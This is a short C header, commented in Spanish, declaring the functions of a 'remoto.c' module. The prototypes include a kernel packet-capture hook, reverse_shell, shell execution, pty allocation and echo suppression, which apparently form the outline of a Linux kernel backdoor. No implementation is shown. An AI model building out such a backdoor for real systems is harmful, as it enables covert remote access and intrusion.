/* funciones de remoto.c */

int capturar(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,
				struct net_device *dev2);
int reverse_shell(void *ip);
void ejecutar_shell(void);
int get_pty(void);
void eco_off(void);

